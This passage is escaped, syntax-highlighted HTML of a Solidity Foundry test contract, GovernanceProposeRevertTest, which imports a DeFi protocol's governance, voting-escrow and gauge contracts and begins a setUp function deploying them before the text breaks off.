class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGovernanceProposeRevertTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan 